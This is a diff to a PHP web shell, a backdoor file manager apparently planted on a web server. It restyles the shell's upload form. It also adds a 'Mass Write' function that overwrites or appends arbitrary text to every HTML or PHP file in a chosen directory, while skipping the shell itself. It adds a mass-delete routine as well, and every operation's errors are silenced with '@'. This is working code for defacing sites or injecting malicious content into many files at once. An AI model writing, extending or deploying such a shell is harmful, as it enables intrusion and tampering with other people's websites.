@@ -198,57 +198,65 @@ td.act {
 td.img {
   width:10px;
 }
-[type="file"] {
-  height: 0;
-  overflow: hidden;
-  width: 0;
+.container {
+  display: block;
+  position: relative;
+  cursor: pointer;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
 }
 
-[type="file"] + label {
-  background: #f15d22;
-  border: none;
-  border-radius: 3px;
-  color: #fff;
-  cursor: pointer;
-  display: inline-block;
-  font-family: 'Poppins', sans-serif;
-  font-size: inherit;
-  font-weight: bold;
-  outline: none;
-  padding: 5px 10px;
-  position: relative;
-  -webkit-transition: all 0.3s;
-  transition: all 0.3s;
-  vertical-align: middle;
-  outline:none;
-}
-[type="file"] + label:hover {
-  background-color: rgba(222,222,222,0.73);
-  outline:red;
-}
-[type="file"] + label.btn-2 {
-  background-color: rgba(222,222,222,0.73);
-  border-radius: 3px;
-  color:#8a8a8a;
-  overflow: hidden;
-}
-[type="file"] + label.btn-2::before {
-  color: #fff;
-  content: "\f382";
-  font-family: "Font Awesome 5 Pro";
-  height: 100%;
-  right: 130%;
-  line-height: 3.3;
+/* Hide the browser's default radio button */
+.container input {
   position: absolute;
-  top: 0px;
-  -webkit-transition: all 0.3s;
-  transition: all 0.3s;
+  opacity: 0;
+  cursor: pointer;
+  float:left;
 }
-[type="file"] + label.btn-2:hover {
-  background-color: #497f42;
+
+/* Create a custom radio button */
+.checkmark {
+  position: absolute;
+  top: 0;
+  left: 0;
+  height: 25px;
+  width: 25px;
+  background-color: #eee;
+  border-radius: 50%;
 }
-[type="file"] + label.btn-2:hover::before {
-  right: 75%;
+
+/* On mouse-over, add a grey background color */
+.container:hover input ~ .checkmark {
+  background-color: #ccc;
+}
+
+/* When the radio button is checked, add a blue background */
+.container input:checked ~ .checkmark {
+  background-color: #2196F3;
+}
+
+/* Create the indicator (the dot/circle - hidden when not checked) */
+.checkmark:after {
+  content: "";
+  position: absolute;
+  display: none;
+}
+
+/* Show the indicator (dot/circle) when checked */
+.container input:checked ~ .checkmark:after {
+  display: block;
+}
+
+/* Style the indicator (dot/circle) */
+.container .checkmark:after {
+  top: 9px;
+  left: 9px;
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+  background: white;
 }
 </style>
 <body>
@@ -396,6 +404,106 @@ function makefile($filename, $text) {
 }
 function makedir($filename) {
   return @mkdir($filename);
+}
+function masswriter($post) {
+  if ($_GET['do'] == 'masswrite') {
+      ?>
+  <thead>
+      <tr>
+        <th>
+          <a class="back" href="?path=<?php print @cwd() ?>">MASS WRITE</a>
+        </th>
+      </tr>
+    </thead>
+  <?php
+  if (isset($_POST['submit'])) {
+    @masswrite($_POST['mode'], $_POST['dir'], $_POST['type'], $_POST['text']);
+  }
+  ?>
+  <form method="post">
+    <tr>
+      <td>
+        <input style="width:98.9%;" class="form-control" type="text" name="dir" value="<?php print @cwd() ?>">
+      </td>
+    </tr>
+    <tr>
+      <td>
+        <select style="width:100%" name="mode" class="form-control">
+          <option>Rewrite</option>
+          <option>Apender</option>
+        </select>
+      </td>
+    </tr>
+    <tr>
+      <td>
+        <input style="width:98.9%;" class="form-control" type="text" name="type" placeholder="type ext : html, php">
+      </td>
+    </tr>
+    <tr>
+      <td>
+        <textarea style="width:99.5%;" class="form-control" name="text"></textarea>
+      </td>
+    </tr>
+    <tr>
+      <td>
+        <input class="btn btn-primary" style="width:100%" type="submit" name="submit" value="MASS">
+      </td>
+    </tr>
+  </form>
+  <?php
+  exit();
+  }
+}
+function masswrite($mode, $dir, $type, $text) {
+  switch ($mode) {
+    case 'Apender':
+      $_mode = "a";
+      break;
+    
+    case 'Rewrite':
+      $_mode = "w";
+      break;
+  }
+  if ($handle = @opendir($dir)) {
+    while (($file = @readdir($handle)) !== false) {
+      if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)) {
+        print("<tr><td>
+          <div class='alert alert-success' role='alert'>
+          <b>".$dir.DIRECTORY_SEPARATOR.$file."</b> Successfully !
+          </div></td></tr>");
+        $fp = @fopen($dir.DIRECTORY_SEPARATOR.$file, $_mode);
+        if ($fp) {
+          @fwrite($fp, $text);
+        } else {
+          print("<tr><td>
+            <div class='alert alert-danger' role='alert'>
+            Error. Access Danied
+            <div></td></tr>");
+        }
+      }
+    }
+  }
+}
+function massdelete($mode, $dir, $type, $text) {
+  if ($handle = @opendir($dir)) {
+    while (($file = @readdir($handle)) !== false) {
+      if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)) {
+        print("<tr><td>
+          <div class='alert alert-success' role='alert'>
+          <b>".$dir.DIRECTORY_SEPARATOR.$file."</b> Successfully !
+          </div></td></tr>");
+        //$fp = @fopen($dir.DIRECTORY_SEPARATOR.$file, $_mode);
+        if (@delete($dir.DIRECTORY_SEPARATOR.$file)) {
+          //@fwrite($fp, $text);
+        } else {
+          print("<tr><td>
+            <div class='alert alert-danger' role='alert'>
+            Error. Access Danied
+            <div></td></tr>");
+        }
+      }
+    }
+  }
 }
 function making($post) {
   if ($_GET['do'] == 'making') {
@@ -564,19 +672,24 @@ function upload($post) {
       <tr>
         <td>
           <center>
-          <input type="radio" name="type" value="biasa" checked> biasa 
+          <label class="container">biasa 
           ( <?php print @permission(@cwd(), "Writable") ?> )
-          <input type="radio" name="type" value="root"> home_root 
-          ( <?php print @permission($_SERVER['DOCUMENT_ROOT'], "Writable") ?> )
+            <input type="radio" name="type" value="biasa" checked="checked">
+            <span class="checkmark"></span>
+          </label>
+          <label class="container">home_root 
+          ( <?php print @permission($_SERVER['DOCUMENT_ROOT'], "Writable") ?>
+            <input type="radio" name="type" value="root">
+            <span class="checkmark"></span>
+          </label>
           </center>
         </td>
       </tr>
       <tr>
         <td>
           <center>
-          <input type="file" name="file" id="file" />
-          <label for="file" class="btn-2">upload</label>
-          <input type="submit" name="submit">
+          <input type="file" name="file">
+          <input type="submit" name="submit" value="Upload">
           </center>
         </td>
       </tr>
@@ -772,6 +885,7 @@ if ($_GET['do'] == 'delete')
 @download("download", $_GET['file']);
 @upload("upload");
 @making("making");
+@masswriter("masswrite");
 ?>
   <thead>
     <tr>
@@ -780,6 +894,7 @@ if ($_GET['do'] == 'delete')
           <option value="" selected>Choose . .</option>
           <option value="?path=<?php print @cwd() ?>&do=upload">Upload File</option>
           <option value="?path=<?php print @cwd() ?>&do=making">Make File</option>
+          <option value="?path=<?php print @cwd() ?>&do=masswrite">Mass Write</option>
       </select>
       </th>
     </tr>
